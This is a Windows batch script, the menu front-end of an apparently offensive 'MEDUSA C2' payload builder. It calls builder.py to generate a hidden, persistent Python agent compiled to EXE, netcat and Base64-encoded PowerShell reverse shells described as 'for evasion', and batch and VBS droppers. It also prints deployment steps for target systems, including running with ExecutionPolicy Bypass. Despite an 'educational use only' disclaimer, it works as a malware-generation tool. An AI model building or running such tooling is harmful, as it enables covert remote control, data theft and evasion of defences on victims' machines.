@echo off
color 0D
REM MEDUSA C2 Builder - Professional Payload Generator
REM Enhanced version with 30-second persistent connections

title MEDUSA C2 Advanced Payload Builder v2.1.0

echo.
echo ================================================================
echo                   MEDUSA C2 PAYLOAD BUILDER
echo                Professional Payload Generator v2.1.0
echo                     Educational Use Only
echo                  30-Second Persistent Connections
echo ================================================================
echo.

REM Check if Python is available
python --version >nul 2>&1
if errorlevel 1 (
    echo ❌ Python not found! Please install Python 3.7+ first.
    echo 📥 Download from: https://python.org/downloads/
    pause
    exit /b 1
) else (
    echo ✅ Python detected and ready
)

REM Check PyInstaller for EXE building
python -c "import PyInstaller" 2>nul
if errorlevel 1 (
    echo ⚠️ PyInstaller not found - EXE building unavailable
    echo 💡 Install with: pip install pyinstaller
) else (
    echo ✅ PyInstaller available for EXE building
)

echo.

:MENU
echo ================================================================
echo                    PAYLOAD GENERATION MENU
echo ================================================================
echo.
echo  [1] 🐍 Generate Python Client + EXE (30s Persistent)
echo  [2] 🌐 Generate Netcat Reverse Shell Commands
echo  [3] 💻 Generate PowerShell Payload (Encoded)
echo  [4] 📝 Generate Batch File Dropper
echo  [5] 📜 Generate VBS Script Dropper
echo  [6] 🧪 Test All Builder Functions
echo  [7] 📚 Advanced Builder Help Guide
echo  [8] 🔍 View Generated Files
echo  [9] 🔙 Return to Main Menu
echo.
set /p choice="[BUILDER] Enter your choice (1-9): "

if "%choice%"=="1" goto PYTHON_CLIENT
if "%choice%"=="2" goto NETCAT
if "%choice%"=="3" goto POWERSHELL
if "%choice%"=="4" goto BATCH_DROPPER
if "%choice%"=="5" goto VBS_DROPPER
if "%choice%"=="6" goto TEST_BUILDER
if "%choice%"=="7" goto HELP
if "%choice%"=="8" goto VIEW_FILES
if "%choice%"=="9" goto EXIT
echo ❌ Invalid choice. Please try again.
echo.
goto MENU

:PYTHON_CLIENT
cls
echo ================================================================
echo              PYTHON CLIENT + EXE GENERATION
echo ================================================================
echo.
echo 🐍 Creating persistent Python client with 30-second intervals
echo 🔧 Features: Stealth mode, auto-reconnect, command execution
echo.
set /p ip="[CONFIG] Enter server IP address: "
set /p port="[CONFIG] Enter server port (default: 4444): "
if "%port%"=="" set port=4444
set /p name="[CONFIG] Enter output name (default: medusa_agent): "
if "%name%"=="" set name=medusa_agent

echo.
echo 📋 Configuration Summary:
echo    - Target Server: %ip%:%port%
echo    - Output Name: %name%
echo    - Persistence: 30-second check-ins
echo    - Stealth: Enabled
echo    - Auto-Reconnect: Infinite attempts
echo.
set /p confirm="[CONFIRM] Proceed with generation? (Y/n): "
if /i "%confirm%"=="n" goto MENU

echo.
echo 🔄 Generating Python client and building executable...
echo.

REM Check if builder.py exists
if not exist "builder.py" (
    echo ❌ Error: builder.py not found!
    echo 💡 Please ensure builder.py exists in the current directory
    pause
    goto MENU
)

python builder.py --type python --ip %ip% --port %port% --output %name% --build-exe --hide-console --persistence
if errorlevel 1 (
    echo ❌ Error occurred during generation!
    pause
    goto MENU
) else (
    echo.
    echo ✅ SUCCESS! Client generated successfully!
    echo 📁 Files created:
    echo    - %name%.py (Python source)
    echo    - %name%.exe (Compiled executable)
    echo.
    echo 🚀 Deployment Instructions:
    echo    1. Copy %name%.exe to target system
    echo    2. Execute with: %name%.exe
    echo    3. Client connects every 30 seconds
    echo    4. Monitor via web dashboard
    echo.
    echo 🔍 Connection Flow Details:
    echo    ➤ Initial connection to %ip%:%port%
    echo    ➤ Client registration and handshake
    echo    ➤ Heartbeat every 30 seconds (±jitter)
    echo    ➤ Command execution on demand
    echo    ➤ Auto-reconnect on network issues
    echo    ➤ Stealth background operation
)
echo.
pause
goto MENU

:NETCAT
cls
echo ================================================================
echo              NETCAT REVERSE SHELL GENERATION
echo ================================================================
echo.
echo 🌐 Generating cross-platform netcat commands
echo 🔗 Supports Windows, Linux, and macOS variants
echo.
set /p ip="[CONFIG] Enter server IP address: "
set /p port="[CONFIG] Enter server port (default: 4444): "
if "%port%"=="" set port=4444

echo.
echo 🔄 Generating netcat reverse shell commands...
echo.

python builder.py --type netcat --ip %ip% --port %port%
if errorlevel 1 (
    echo ❌ Error occurred during generation!
) else (
    echo.
    echo ✅ SUCCESS! Netcat commands generated!
    echo 📜 Available variants displayed above
    echo 🚀 Copy and execute on target systems
)
echo.
pause
goto MENU

:POWERSHELL
cls
echo ================================================================
echo             POWERSHELL PAYLOAD GENERATION
echo ================================================================
echo.
echo 💻 Creating encoded PowerShell reverse shell
echo 🔐 Base64 encoded for evasion
echo.
set /p ip="[CONFIG] Enter server IP address: "
set /p port="[CONFIG] Enter server port (default: 4444): "
if "%port%"=="" set port=4444
set /p name="[CONFIG] Enter output name (default: ps_payload): "
if "%name%"=="" set name=ps_payload

echo.
echo 🔄 Generating PowerShell payload with encoding...
echo.

python builder.py --type powershell --ip %ip% --port %port% --output %name% --encode
if errorlevel 1 (
    echo ❌ Error occurred during generation!
) else (
    echo.
    echo ✅ SUCCESS! PowerShell payload generated!
    echo 📁 File created: %name%.ps1
    echo 🚀 Execute with: powershell.exe -ExecutionPolicy Bypass -File %name%.ps1
)
echo.
pause
goto MENU

:BATCH_DROPPER
cls
echo ================================================================
echo               BATCH FILE DROPPER GENERATION
echo ================================================================
echo.
echo 📝 Creating Windows batch file dropper
echo 🚀 Automated deployment and execution
echo.
set /p ip="[CONFIG] Enter server IP address: "
set /p port="[CONFIG] Enter server port (default: 4444): "
if "%port%"=="" set port=4444
set /p name="[CONFIG] Enter output name (default: dropper): "
if "%name%"=="" set name=dropper

echo.
echo 🔄 Generating batch dropper...
echo.

python builder.py --type batch --ip %ip% --port %port% --output %name%
if errorlevel 1 (
    echo ❌ Error occurred during generation!
) else (
    echo.
    echo ✅ SUCCESS! Batch dropper generated!
    echo 📁 File created: %name%.bat
    echo 🚀 Execute with: %name%.bat
)
echo.
pause
goto MENU

:VBS_DROPPER
cls
echo ================================================================
echo                VBS SCRIPT DROPPER GENERATION
echo ================================================================
echo.
echo 📜 Creating VBScript dropper
echo 🤫 Stealth execution capabilities
echo.
set /p ip="[CONFIG] Enter server IP address: "
set /p port="[CONFIG] Enter server port (default: 4444): "
if "%port%"=="" set port=4444
set /p name="[CONFIG] Enter output name (default: dropper): "
if "%name%"=="" set name=dropper

echo.
echo 🔄 Generating VBS dropper...
echo.

python builder.py --type vbs --ip %ip% --port %port% --output %name%
if errorlevel 1 (
    echo ❌ Error occurred during generation!
) else (
    echo.
    echo ✅ SUCCESS! VBS dropper generated!
    echo 📁 File created: %name%.vbs
    echo 🚀 Execute with: wscript %name%.vbs
)
echo.
pause
goto MENU

:TEST_BUILDER
cls
echo ================================================================
echo                 TESTING BUILDER FUNCTIONS
echo ================================================================
echo.
echo 🧪 Running comprehensive builder tests...
echo 🔍 This will test all payload generation functions
echo.

if exist "test_builder.py" (
    python test_builder.py
) else (
    echo ❌ test_builder.py not found!
    echo 💡 Manual test with builder.py --help
    python builder.py --help
)
echo.
pause
goto MENU

:HELP
cls
echo ================================================================
echo                 MEDUSA C2 BUILDER HELP GUIDE
echo ================================================================
echo.
echo 📚 Command Line Usage:
echo python builder.py --type [TYPE] --ip [IP] --port [PORT] [OPTIONS]
echo.
echo 🛠️ Available Payload Types:
echo   python     - Generate Python client (can build EXE)
echo   netcat     - Generate netcat reverse shell commands
echo   powershell - Generate PowerShell reverse shell script
echo   batch      - Generate Windows batch dropper
echo   vbs        - Generate VBScript dropper
echo.
echo ⚙️ Advanced Options:
echo   --output NAME     - Output filename (without extension)
echo   --build-exe       - Build executable with PyInstaller (Python only)
echo   --hide-console    - Hide console window (Python/EXE only)
echo   --persistence     - Add persistence mechanisms (Python only)
echo   --encode          - Base64 encode payload (PowerShell only)
echo   --icon FILE       - Icon file for executable (EXE only)
echo.
echo 🚀 Usage Examples:
echo python builder.py --type python --ip 192.168.1.100 --port 4444 --build-exe --hide-console
echo python builder.py --type powershell --ip 192.168.1.100 --port 4444 --encode
echo python builder.py --type netcat --ip 192.168.1.100 --port 4444
echo.
echo 🔍 Persistence Details (30-Second Intervals):
echo   ➤ Client connects every 30 seconds (± random jitter)
echo   ➤ Auto-reconnection on network failures
echo   ➤ Exponential backoff for failed connections
echo   ➤ Stealth operation with no visible windows
echo   ➤ Command execution on server demand
echo   ➤ File transfer capabilities
echo   ➤ Screenshot capture functionality
echo.
echo 📚 For detailed documentation, see BUILDER_GUIDE.md
echo 🌐 Online docs: https://medusa-c2.readthedocs.io
echo.
pause
goto MENU

:VIEW_FILES
cls
echo ================================================================
echo                    GENERATED FILES VIEWER
echo ================================================================
echo.
echo 📁 Checking for generated payload files...
echo.

if exist "payloads" (
    echo 📂 Payloads directory contents:
    dir /b payloads\
    echo.
) else (
    echo ⚠️ No payloads directory found
)

echo 📁 Current directory Python files:
dir /b *.py 2>nul
echo.
echo 📁 Current directory executables:
dir /b *.exe 2>nul
echo.
echo 📁 Current directory scripts:
dir /b *.ps1 *.bat *.vbs 2>nul
echo.

set /p view_file="[OPTION] Enter filename to view (or press Enter to continue): "
if not "%view_file%"=="" (
    if exist "%view_file%" (
        echo.
        echo 👁️ Viewing: %view_file%
        echo ================================================================
        type "%view_file%"
        echo ================================================================
    ) else (
        echo ❌ File not found: %view_file%
    )
)
echo.
pause
goto MENU

:EXIT
cls
echo ================================================================
echo              EXITING MEDUSA C2 PAYLOAD BUILDER
echo ================================================================
echo.
echo 🙏 Thank you for using MEDUSA C2 Builder!
echo ⚠️ Remember: Educational and authorized use only!
echo 📧 Report issues: https://github.com/medusa-c2/medusa/issues
echo.
echo 🔍 Quick Summary of Generated Payloads:
echo   ➤ All payloads use 30-second persistent connections
echo   ➤ Auto-reconnection with exponential backoff
echo   ➤ Stealth operation capabilities
echo   ➤ Cross-platform compatibility
echo.
echo 📈 Deployment Best Practices:
echo   1. Test in controlled environments first
echo   2. Ensure proper authorization before deployment
echo   3. Monitor connections via web dashboard
echo   4. Clean up after authorized testing
echo.
echo 🚀 Builder session completed successfully!
echo.
pause
exit /b 0